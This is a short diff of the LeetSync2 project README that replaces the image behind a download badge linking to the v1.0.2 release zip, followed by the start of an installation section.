@@ -1,5 +1,5 @@
 
-[![Download](https://cdn.pixabay.com/photo/2023/02/09/15/32/download-7779081_1280.png)](https://github.com/disturbedlord/LeetSync2/releases/download/v1.0.2/LeetSync2_v1.0.2.zip)
+[![Download](https://github.com/user-attachments/assets/3b6bf25f-59c1-47f0-aabe-b2ea586bab66)](https://github.com/disturbedlord/LeetSync2/releases/download/v1.0.2/LeetSync2_v1.0.2.zip)
 ## Installation
 
 To install LeetSync2, follow these steps:
